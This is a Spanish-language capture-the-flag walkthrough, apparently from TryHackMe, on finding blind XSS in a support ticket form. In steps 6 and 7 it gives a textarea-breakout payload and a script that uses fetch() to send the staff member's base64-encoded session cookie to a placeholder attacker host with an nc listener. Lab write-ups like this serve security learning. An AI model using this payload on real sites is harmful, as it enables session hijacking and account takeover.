1. Vamos al sitio web que nos dan.
   ![[Pasted image 20251109113901.png]]
2. Para este reto vamos a buscar algún sitio en el que introducir texto y que quede reflejado. Siguiendo lo que hemos visto podemos recordar que el espacio donde se crean tickets en una página podría tener una Blind XSS.
   
   ![[Pasted image 20251109114101.png]]
3. Vemos el panel de entrada:
   ![[Pasted image 20251109114145.png]]
4. Empezaremos probando con un "test" para ver donde se refleja. Si abrimos el ticket podemos ver lo siguiente:
   ![[Pasted image 20251109114321.png]]
5. Y revisando el código fuente:
   ![[Pasted image 20251109114352.png]]
6. Vemos que está dentro de una etiqueta `<textarea>`. Vamos a aplicar lo aprendido para bypassearlo. Usaremos alert() para comprobarlo: `</textarea><script>alert('THM');</script>`. Si abrimos el ticket:
   ![[Pasted image 20251109120330.png]]
7. Podemos estar seguros casi al 100% de que un miembro del staff verá el ticket, por lo que vamos a intentar robar su cookie de sesión. Para ello:
	1. Nos ponemos en escucha con `nc`:
	   ![[Pasted image 20251109120648.png]]
	2. Introducimos el payload necesario: `</textarea><script>fetch('http://URL_O_IP_ATACANTE:PUERTO_ATACANTE?cookie=' + btoa(document.cookie) );</script>.
	   ![[Pasted image 20251109121218.png]]
	   
	   - El comando `fetch()` hace una petición HTTP.
	   - El comando `btoa()` base64-encodea la string.
	   - `document.cookie` accede a la cookie de la víctima para ese sitio.
	3. Esperamos la conexión.
	   ![[Pasted image 20251109121312.png]]
	4. Si alguien abre el ticket:
	   ![[Pasted image 20251109122011.png]]
8. Ahí podemos ver la cookie, que la desencodearemos:
   ![[Pasted image 20251109122109.png]]

